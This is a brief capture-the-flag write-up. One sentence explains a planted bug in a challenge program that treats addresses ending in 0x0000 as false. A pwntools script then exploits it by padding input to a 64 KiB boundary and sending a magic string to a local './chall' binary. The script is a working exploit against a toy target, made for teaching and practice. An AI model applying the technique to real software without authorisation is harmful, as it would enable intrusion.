This program overwrites `bool` to provide a subtle bug: any returned address with the last 2
bytes as 0x0000 will evaluate as falsy.

```python
from pwn import *

p = process("./chall")

p.recvuntil(b"prepare to write to buffer at: ")

buffer_addr = int(p.recvline(keepends=False), 16)

needed_padding = 0x10000 - (buffer_addr & 0xFFFF)

payload = b""
payload += b"A" * needed_padding
payload += b"givemetheflagpls"

p.recvuntil(b"please enter your super secret string: ")
p.sendline(payload)

p.interactive()
```
